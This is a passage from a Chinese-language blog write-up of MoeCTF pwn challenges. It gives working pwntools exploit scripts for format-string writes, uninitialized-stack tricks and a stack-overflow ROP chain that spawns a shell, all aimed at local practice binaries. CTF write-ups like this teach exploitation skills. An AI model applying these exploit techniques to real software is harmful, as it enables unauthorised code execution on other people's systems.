<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">45851</span>)<br><span class="hljs-comment">#p=process(&#x27;./format_level1&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;b printf&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ready</span>(<span class="hljs-params">x</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(x).encode())<br>hp = <span class="hljs-number">0x804C00C</span><br>ak = <span class="hljs-number">0x0804C014</span> + <span class="hljs-number">4</span><br>ready(<span class="hljs-number">3</span>)<br>payload = p32(hp) + <span class="hljs-string">b&#x27;%7$n&#x27;</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Input what you want to talk: &#x27;</span>)<br>p.send(payload)<br><br>ready(<span class="hljs-number">3</span>)<br>payload = p32(ak) + <span class="hljs-string">b&#x27;%7$n&#x27;</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Input what you want to talk: &#x27;</span>)<br>p.send(payload)<br><br>ready(<span class="hljs-number">1</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h1 id="第二次"><a href="#第二次" class="headerlink" title="第二次"></a>第二次</h1><h2 id="uninitialized-key"><a href="#uninitialized-key" class="headerlink" title="uninitialized_key"></a>uninitialized_key</h2><p>两次调用函数，name和key局部变量分配的栈位置是一致的，且key变量未清零，所以设name为114514，key变量输入非数字符号使scanf无作用，便可使key依然保持114514的值。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230824231958630.png" alt="image-20230824231958630" data-caption="image-20230824231958630" loading="lazy"></p>
<h2 id="uninitialized-key-plus"><a href="#uninitialized-key-plus" class="headerlink" title="uninitialized_key_plus"></a>uninitialized_key_plus</h2><p>同理，只是这题前者函数输入的是字符串，因此利用pwntools工具的p32即可。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230824232448201.png" alt="image-20230824232448201" data-caption="image-20230824232448201" loading="lazy"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;localhost&#x27;</span>, <span class="hljs-number">42705</span>)<br><span class="hljs-comment">#p = process(&#x27;./uninitialized_key_plus&#x27;)</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">114514</span>)<br>p.sendline(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;key:\n&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<h2 id="rePWNse"><a href="#rePWNse" class="headerlink" title="rePWNse"></a>rePWNse</h2><p>能修改v7到v13的值，满足所有if的条件，使得s为字符串’&#x2F;bin&#x2F;sh’，否则s内会存在随机字符。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++">v10*v8==<span class="hljs-number">10</span>*v11+v12;	<span class="hljs-comment">// a*a = 10*(a-b) + v12</span><br>v12==v13+<span class="hljs-number">1</span>;		<span class="hljs-comment">// </span><br><span class="hljs-comment">//src[v8]需为/bin/sh的第三个字符&#x27;i&#x27;，所以a=9</span><br>v8==v10;			<span class="hljs-comment">// a</span><br><span class="hljs-comment">//src[v13]需为第5个字符&#x27;/&#x27;，v13=0</span><br>v7==v9;			<span class="hljs-comment">//b</span><br>v10-v11==v7;		<span class="hljs-comment">//v11 = a-b</span><br><br><span class="hljs-comment">/* 因此</span><br><span class="hljs-comment">a=9 v13=0</span><br><span class="hljs-comment">v12 = 1</span><br><span class="hljs-comment">9*9 = 81 = 10*(9-b) + 1</span><br><span class="hljs-comment">b = 1</span><br><span class="hljs-comment">v7-v13应为</span><br><span class="hljs-comment">1 9 1 9 8 1 0</span><br><span class="hljs-comment">*/</span><br><br></code></pre></td></tr></table></figure>

<p>随后利用栈溢出和后门函数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#!/usr/bin/python3<br>from pwn import *<br>context(log_level=&#x27;debug&#x27;)<br><br>#p = process(&#x27;./rePWNse&#x27;)<br>p =remote(&#x27;localhost&#x27;,41225)<br><br>p.recvuntil(b&#x27;digits:\n&#x27;)<br>p.sendline(b&#x27;1 9 1 9 8 1 0&#x27;)<br>p.recvuntil(b&#x27;address is:&#x27;)<br><br>binsh = int(p.recvuntil(b&#x27;\n&#x27;)[:-1].decode(),16)<br>print(hex(binsh))<br>rdi_ret = 0x40168e<br>exe = 0x401296<br>offset = 0x40 + 8<br>payload = b&#x27;a&#x27;*offset + p64(rdi_ret) + p64(binsh) + p64(exe)<br><br>p.send(payload)<br>p.sendline(b&#x27;cat flag&#x27;)<br>print(p.recv())<br>p.interactive()<br></code></pre></td></tr></table></figure>



<h2 id="format-level2"><a href="#format-level2" class="headerlink" title="format_level2"></a>format_level2</h2><p>这次attack函数内不再跳转后门函数，因此该函数失去价值。</p>
<p>这时利用hijack retaddr，修改返回地址指向攻击函数。</p>
<p>因为输入限制16字节，不能做到一次性修改，所以分成4次，%hn每次修改一个字节，最终修改完四字节。</p>
<p>因为多次调用函数，所以选择修改game函数的返回地址，利用printf先泄露一个栈上地址，然后根据偏移计算出目标地址。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230827231550756.png" alt="image-20230827231550756" data-caption="image-20230827231550756" loading="lazy"></p>
<p>泄露printf函数第二个参数的内容，即指向字符串的地址，计算与game函数返回地址储存位置的偏移。0xffa438fc-0xffa438bc &#x3D; 0x40.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p=remote(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-number">42385</span>)<br><span class="hljs-comment">#p=process(&#x27;./format_level2&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;b *0x0804974c&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ready</span>(<span class="hljs-params">x</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(x).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">addr, target</span>):<br>    target -= <span class="hljs-number">4</span><br>    <br>    payload = p32(addr) + <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(target).encode() + <span class="hljs-string">b&#x27;d%7$hn&#x27;</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(payload) &lt;= <span class="hljs-number">16</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;Input what you want to talk: &#x27;</span>)<br>    p.send(payload)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmth</span>(<span class="hljs-params">addr, target</span>):<br>    target -= <span class="hljs-number">4</span><br>    <br>    payload = p32(addr) + <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(target).encode() + <span class="hljs-string">b&#x27;d%7$hhn&#x27;</span><br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(payload) &lt;= <span class="hljs-number">16</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;Input what you want to talk: &#x27;</span>)<br>    p.send(payload)<br><br>gadget = <span class="hljs-number">0x08049317</span><br>ready(<span class="hljs-number">3</span>)<br>payload = <span class="hljs-string">b&#x27;%p\n&#x27;</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Input what you want to talk: &#x27;</span>)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;You said: \n&#x27;</span>)<br>addr = <span class="hljs-built_in">int</span> (p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><br>ret_addr = addr + <span class="hljs-number">0x40</span><br>P = p32(ret_addr) + <span class="hljs-string">b&#x27;%&#x27;</span> +<span class="hljs-built_in">str</span>(gadget).encode()+<span class="hljs-string">b&#x27;d%7$n&#x27;</span><br><br>ready(<span class="hljs-number">3</span>)<br>fmt(ret_addr, <span class="hljs-number">0x17</span>)<br>ready(<span class="hljs-number">3</span>)<br>fmt(ret_addr+<span class="hljs-number">1</span>, <span class="hljs-number">0x93</span>)<br>ready(<span class="hljs-number">3</span>)<br>fmth(ret_addr+<span class="hljs-number">2</span>, <span class="hljs-number">0x804</span>)<br><br>ready(<span class="hljs-number">4</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="format-level3"><a href="#format-level3" class="headerlink" title="format_level3"></a>format_level3</h2><p>这次字符串str不再位于栈中，而是作为全局变量位于bss段上，因此无法在字符串中写入要修改内存的地址以达到修改指定地址的目的。这时选择利用栈中已有地址进行跳板修改。</p>
<p>ebp地址是连锁的，所以可以利用其先修改栈上地址使其指向栈上返回地址，之后再修改栈上返回地址指向后门函数。</p>
<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230827234348784.png" alt="image-20230827234348784" data-caption="image-20230827234348784" loading="lazy"></p>
<p>printf第7个参数为0xff894538处的0xff894558，%6$n则会修改0xff894558处的值，将其修改为0xff89455c。</p>
<p>0xff894558-0xff894520 &#x3D; 0x38 ，第15个参数位于0xff894558, %14$n会修改0xff89455c处的值，将其修改为后门函数地址。即可实现攻击。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><br><span class="hljs-comment">#p=remote(&#x27;localhost&#x27;,35397)</span><br>p=process(<span class="hljs-string">&#x27;./format_level3&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p,&#x27;b printf&#x27;)</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ready</span>(<span class="hljs-params">x</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;Your choice: &#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(x).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">offset, target</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;offset &#x27;</span>,<span class="hljs-built_in">hex</span>(offset))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;target &#x27;</span>,<span class="hljs-built_in">hex</span>(target))<br>    payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(target).encode() + <span class="hljs-string">b&#x27;d%&#x27;</span>+ <span class="hljs-built_in">str</span>(offset).encode() + <span class="hljs-string">b&#x27;$n&#x27;</span><br>    <span class="hljs-built_in">print</span>(payload, <span class="hljs-built_in">len</span>(payload))<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(payload) &lt;= <span class="hljs-number">16</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;Input what you want to talk: &#x27;</span>)<br>    p.send(payload)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmth</span>(<span class="hljs-params">offset, target</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;offset &#x27;</span>,<span class="hljs-built_in">hex</span>(offset))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;target &#x27;</span>,<span class="hljs-built_in">hex</span>(target))<br>    payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(target).encode() + <span class="hljs-string">b&#x27;d%&#x27;</span>+ <span class="hljs-built_in">str</span>(offset).encode() + <span class="hljs-string">b&#x27;$hhn&#x27;</span><br>    <span class="hljs-built_in">print</span>(payload, <span class="hljs-built_in">len</span>(payload))<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(payload) &lt;= <span class="hljs-number">16</span><br>    p.recvuntil(<span class="hljs-string">b&#x27;Input what you want to talk: &#x27;</span>)<br>    p.send(payload)<br>    <br>gadget = <span class="hljs-number">0x08049317</span><br><span class="hljs-comment">#first_offset = ( 0xffffcf68 - 0xffffcf50 ) //4</span><br><span class="hljs-comment">#ret_addr = addr + 0xffffcf8c - 0xffffcf54</span><br><span class="hljs-comment">#second_offset = (0xffffcf8c - 0xffffcf50) //4 </span><br>first_offset = ( <span class="hljs-number">0xff894538</span> -<span class="hljs-number">0xff894520</span>) //<span class="hljs-number">4</span><br>second_offset = (<span class="hljs-number">0xff894558</span> - <span class="hljs-number">0xff894520</span>) //<span class="hljs-number">4</span> <br><br>ready(<span class="hljs-number">3</span>)<br>payload = <span class="hljs-string">b&#x27;%&#x27;</span>+ <span class="hljs-built_in">str</span>(first_offset).encode() + <span class="hljs-string">b&#x27;$p\n&#x27;</span><br>p.recvuntil(<span class="hljs-string">b&#x27;Input what you want to talk: &#x27;</span>)<br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;You said: \n&#x27;</span>)<br>addr = <span class="hljs-built_in">int</span> (p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;addr&#x27;</span>,<span class="hljs-built_in">hex</span>(addr))<br><br>ret_addr = addr +  <span class="hljs-number">0xff89455c</span> - <span class="hljs-number">0xff894558</span> <br>sleep(<span class="hljs-number">1</span>)<br><br>ready(<span class="hljs-number">3</span>)<br>fmth(first_offset, ret_addr&amp;<span class="hljs-number">0xffff</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ret_addr &#x27;</span>,<span class="hljs-built_in">hex</span>(ret_addr))<br>sleep(<span class="hljs-number">1</span>)<br><br>ready(<span class="hljs-number">3</span>)<br>fmt(second_offset, gadget)<br>sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">#ready(3)</span><br><span class="hljs-comment">#fmth(second_offset, gadget&gt;&gt;16)</span><br>ready(<span class="hljs-number">4</span>)<br>sleep(<span class="hljs-number">1</span>)<br>      <br>p.interactive()<br></code></pre></td></tr></table></figure>

<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230827235654382.png" alt="image-20230827235654382" data-caption="image-20230827235654382" loading="lazy"></p>
<h2 id="shellcode-level3"><a href="#shellcode-level3" class="headerlink" title="shellcode_level3"></a>shellcode_level3</h2><p><img onerror="imgOnError(this);" data-fancybox="gallery" src="/./moectf/image-20230917214109763.png" alt="image-20230917214109763" data-caption="image-20230917214109763" loading="lazy"></p>
<p>偏移</p>

    </div>
</article>


                </div>
                <aside class="col-md-4 gal-left" id="sidebar">
    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
<aside id="sidebar-search">
    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
        <form class="form-inline clearfix" id="search-form" method="get"
              action="/search/index.html">
            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~" autocomplete="off">
            <button class="btn btn-danger btn-gal" type="submit">
                <i class="fa fa-search"></i>
            </button>
        </form>
    </div>
</aside>
    <aside id="sidebar-author">
    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
        <div class="panel-heading" style="text-align: center">
            <i class="fa fa-quote-left"></i>
            Walt CSZ
            <i class="fa fa-quote-right"></i>
        </div>
        <div class="author-panel text-center">
            <img src="/imgs/avatar.jpg" width="140" height="140"
                 alt="个人头像" class="author-image">
            <p class="author-description"></p>
        </div>
    </div>
</aside>
    
    <aside id="sidebar-recent_comments">
    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
        <div class="panel-heading">
            <i class="fa fa-comments"></i>
            最新评论
            <i class="fa fa-times-circle panel-remove"></i>
            <i class="fa fa-chevron-circle-up panel-toggle"></i>
        </div>
        <ul class="list-group list-group-flush"></ul>
    </div>
</aside>
    
    <!-- 要配置好leancloud才能开启此小工具 -->
    
    
    <aside id="sidebar-recent_posts">
    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
        <div class="panel-heading">
            <i class="fa fa-refresh"></i>
            近期文章
            <i class="fa fa-times-circle panel-remove"></i>
            <i class="fa fa-chevron-circle-up panel-toggle"></i>
        </div>
        <ul class="list-group list-group-flush">
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/10/26/writeUp/0xgame/">0xgame</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/10/23/writeUp/newstarctf2023_week5/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/10/20/writeUp/newstarctf/">newstarctf</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/10/19/hello-world/">Hello World</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/10/19/writeUp/newstarctf2023_week4/">newstartctf2023_week4</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/09/11/writeUp/buu_0910/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/09/07/writeUp/%E5%BC%82%E6%9E%B6%E6%9E%84/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/09/03/writeUp/wmctf23/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/08/31/writeUp/buu_0830/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/08/26/writeUp/buu_0824/"></a>
                </span>
            </li>
            
        </ul>
    </div>
</aside>
    
    
    <aside id="sidebar-rand_posts">
    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
        <div class="panel-heading">
            <i class="fa fa-refresh"></i>
            随机文章
            <i class="fa fa-times-circle panel-remove"></i>
            <i class="fa fa-chevron-circle-up panel-toggle"></i>
        </div>
        <ul class="list-group list-group-flush">
            
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/10/19/hello-world/">Hello World</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/09/11/writeUp/buu_0910/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/08/12/writeUp/moectf/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/10/19/writeUp/newstarctf2023_week4/">newstartctf2023_week4</a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/07/20/writeUp/pwn%E5%9F%BA%E7%A1%80/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/09/03/writeUp/wmctf23/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/08/12/writeUp/%E5%A0%86/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/09/07/writeUp/%E5%BC%82%E6%9E%B6%E6%9E%84/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/08/20/writeUp/%E6%B1%87%E7%BC%96/"></a>
                </span>
            </li>
            
            <li class="list-group-item">
                <span class="post-title">
                    <a href="/2023/10/20/writeUp/newstarctf/">newstarctf</a>
                </span>
            </li>
            
        </ul>
    </div>
</aside>
    
    
    <aside id="gal-sets">
        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
            <ul class="nav nav-pills pills-gal">

                
                <li>
                    <a href="/2023/08/12/writeUp/moectf/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                </li>
                
                
                <li>
                    <a href="/2023/08/12/writeUp/moectf/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                </li>
                
                
                <li>
                    <a href="/2023/08/12/writeUp/moectf/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                </li>
                
            </ul>
            <div class="tab-content">
                
                <div class="cloud-tags tab-pane nav bs-sidenav fade" id="sidebar-tags">
    
</div>
                
                
                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
    
    <li>
        <a href="http://kdays.net/days/" target="_blank">KDays Forum</a>
    </li>
    
    <li>
        <a href="http://www.gal123.com/" target="_blank">绅士导航♂</a>
    </li>
    
    <li>
        <a href="http://www.moe123.com/" target="_blank">萌导航</a>
    </li>
    
</div>
                
                
                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
    
    <li>
        <a href="https://github.com/ZEROKISEKI/" target="_blank">Github</a>
    </li>
    
    <li>
        <a href="https://coding.net/u/SORA1" target="_blank">Coding</a>
    </li>
    
    <li>
        <a href="https://www.zhihu.com/people/aonosora/activities" target="_blank">知乎</a>
    </li>
    
</div>
                
            </div>
        </div>
    </aside>
    
</aside>
            </div>
        </div>
    </div>
    <footer id="gal-footer">
    <div class="container">
        Copyright © 2018 Walt CSZ Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
    </div>
</footer>

<!-- 回到顶端 -->
<div id="gal-gotop">
    <i class="fa fa-angle-up"></i>
</div>
</body>

<script src="/js/activate-power-mode.js"></script>

<script>

    // 配置highslide
	hs.graphicsDir = '/js/highslide/graphics/'
    hs.outlineType = "rounded-white";
    hs.dimmingOpacity = 0.8;
    hs.outlineWhileAnimating = true;
    hs.showCredits = false;
    hs.captionEval = "this.thumb.alt";
    hs.numberPosition = "caption";
    hs.align = "center";
    hs.transitions = ["expand", "crossfade"];
    hs.lang.number = '共%2张图, 当前是第%1张';
    hs.addSlideshow({
      interval: 5000,
      repeat: true,
      useControls: true,
      fixedControls: "fit",
      overlayOptions: {
        opacity: 0.75,
        position: "bottom center",
        hideOnMouseOut: true
      }
    })

    // 初始化aos
    AOS.init({
      duration: 1000,
      delay: 0,
      easing: 'ease-out-back'
    });

</script>
<script>
	POWERMODE.colorful = 'true';    // make power mode colorful
	POWERMODE.shake = 'true';       // turn off shake
	// TODO 这里根据具体情况修改
	document.body.addEventListener('input', POWERMODE);
</script>
<script>
    window.slideConfig = {
      prefix: '/imgs/slide/background',
      ext: 'jpg',
      maxCount: '6'
    }
</script>

<script src="/js/hs.js"></script>
<script src="/js/blog.js"></script>




</html>